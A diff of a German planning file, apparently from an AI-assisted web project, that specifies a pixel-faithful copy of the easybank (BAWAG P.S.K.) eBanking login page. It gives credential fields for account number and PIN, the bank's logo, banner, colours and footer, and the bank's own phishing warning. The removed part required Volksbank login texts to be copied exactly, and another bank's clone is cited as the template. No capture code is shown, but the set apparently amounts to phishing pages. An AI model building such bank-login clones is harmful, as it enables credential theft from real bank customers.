@@ -1,30 +1,88 @@
 
 
-## Volksbank Sprachumschaltung (DE/EN)
+## Neue Seite `/easybank` — korrigiertes Layout
 
-### Änderungen in `src/pages/Volksbank.tsx`
+### Korrigiertes Layout (aus Screenshot analysiert)
 
-**1. Neuer State:** `const [lang, setLang] = useState<"de" | "en">("de");`
+```text
+┌─────────────────────────────────────────────────────────────────────────┐
+│  [easybank Logo]                          Hilfe  [deutsch ▼]           │
+│                                          Dienstag, 07.04.2026 - 09:58  │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                        │
+│  ┌────────────────────┐  ┌──────────────┐ ┌──────────┐ ┌──────────┐   │
+│  │ Login mit Zugangs- │  │  Warnung     │ │Hilfe/    │ │ Info     │   │
+│  │ daten       Hilfe  │  │              │ │Hotline   │ │          │   │
+│  │                    │  │ ⚠ Achtung    │ │          │ │ Bestell. │   │
+│  │ Wie wollen Sie     │  │ vor Phishing │ │ PIN verg.│ │ PIN-Code │   │
+│  │ sich einloggen?    │  │ Wir fordern  │ │ oder     │ │ Debitk.  │   │
+│  │                    │  │ Sie niemals  │ │ Verfüger │ │          │   │
+│  │ [Verfüger][App]    │  │ per E-Mail   │ │ gesperrt?│ │ Alle     │   │
+│  │ ──────────         │  │ oder SMS auf │ │          │ │ Infos z. │   │
+│  │                    │  │ TANs, Konto- │ │ FAQ      │ │ easybank │   │
+│  │ Verfügernr [____]  │  │ und Kredit-  │ │          │ │ App      │   │
+│  │ Verfüger ohne      │  │ karten-Daten │ │          │ │          │   │
+│  │ führende Nullen!   │  │ einzugeben   │ │          │ │ Zu       │   │
+│  │                    │  │ oder zu      │ │          │ │ Watchlist│   │
+│  │ PIN    [______] 👁 │  │ bestätigen!  │ │          │ │ Internet │   │
+│  │ 8 bis 16-stellig   │  │              │ │          │ │          │   │
+│  │                    │  │ Weiterlesen  │ │          │ │          │   │
+│  │        [Login ►]   │  │              │ │          │ │          │   │
+│  │                    │  └──────────────┘ └──────────┘ └──────────┘   │
+│  │ ► eBanking Zugang  │  ┌────────────────────────────────────────┐   │
+│  │   entsperren       │  │                                        │   │
+│  │                    │  │  [Banner: Freunde empfehlen, Link in   │   │
+│  └────────────────────┘  │   der App nutzen und Prämie erhalten]  │   │
+│                          │                                        │   │
+│                          └────────────────────────────────────────┘   │
+│                                                                        │
+├─────────────────────────────────────────────────────────────────────────┤
+│  Impressum  AGB  Datenschutz  Nutzungsbedingungen  Barrierefrei       │
+│                         © BAWAG P.S.K.                                 │
+└─────────────────────────────────────────────────────────────────────────┘
+```
 
-**2. English/Deutsch-Toggle:** Der Link wechselt zwischen "English" und "Deutsch" und toggled den State.
+**Wichtig:** Die Login-Card steht links und ist höher als die 3 rechten Spalten. Das Banner-Bild sitzt **nur rechts** unter den 3 Cards (Warnung, Hilfe, Info) — NICHT unter der Login-Card und NICHT full-width.
 
-**3. Alle Texte bedingt nach `lang`:**
+### Struktur im Detail
 
-| Element | Deutsch | English |
-|---------|---------|---------|
-| Header-Bar | hausbanking Login | Login |
-| Info-Text | Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten. | You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN. |
-| Label | Anmeldung mit Benutzername | User name or authorised party number |
-| Button | Weiter | Continue |
-| Link 1 | Benutzername vergessen? | Forgot username? |
-| Link 2 | Passwort vergessen? | Forgot password? |
-| Terms-Text | Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu. | **komplett ausblenden** |
-| Toggle-Link | English | Deutsch |
+**Header:** Logo links, "Hilfe" + Dropdown (`deutsch`/`english`) rechts oben, Datum rechts darunter.
 
-**4. Terms-Text:** Nur rendern wenn `lang === "de"` via `{lang === "de" && (<p>...</p>)}`
+**Hauptbereich — 2 Bereiche nebeneinander:**
+- **Links (~40%):** Login-Card (volle Höhe)
+- **Rechts (~60%):** Oben 3 gleich breite Cards nebeneinander, darunter Banner-Bild
 
-Alle Texte exakt 1:1 wie vorgegeben.
+**Login Card:**
+- Header: "Login mit Zugangsdaten" + "Hilfe" rechts
+- "Wie wollen Sie sich einloggen?"
+- Tabs: "Verfüger" (aktiv, grüne Unterstreichung) | "Mit der App"
+- Verfüger-Tab: Verfügernummer-Input + Hinweis + PIN-Input mit Eye-Toggle + Hinweis + Login-Button (grün, rechts) + "eBanking Zugang entsperren" Link
 
-### Datei
-- `src/pages/Volksbank.tsx`
+**3 Info-Cards (rechts oben, nebeneinander):**
+- Warnung (teal Überschrift): Phishing-Warnung + "Weiterlesen"
+- Hilfe/Hotline (teal): PIN vergessen + FAQ
+- Info (teal): PIN-Code Debitkarte + easybank App + Watchlist Internet
+
+**Banner (rechts unten):** `EASY26016_login.jpg` unter den 3 Cards
+
+**Footer:** Impressum, AGB, Datenschutz, Nutzungsbedingungen, Barrierefrei + © BAWAG P.S.K.
+
+### Farben
+- Primär-Grün: `#8ab528` (Login-Button, aktiver Tab)
+- Teal: `#009e9a` (Card-Überschriften Warnung/Hilfe/Info)
+- Hintergrund: Weiß
+- Cards: Weiß mit dünnem grauen Border
+
+### Sprach-Umschaltung (deutsch/english)
+Dropdown wechselt alle Texte. Englische Übersetzungen analog zu Bawag-Schema.
+
+### Technisch
+- Bawag-Skalierungsmuster (BASE_WIDTH 970, transform scale)
+- Neues File: `src/pages/Easybank.tsx`
+- Route `/easybank` in `App.tsx`
+- Assets: `logo-easybank_de.png` + `EASY26016_login.jpg` → `src/assets/`
+
+### Dateien
+- `src/pages/Easybank.tsx` (neu)
+- `src/App.tsx` (Route hinzufügen)
 
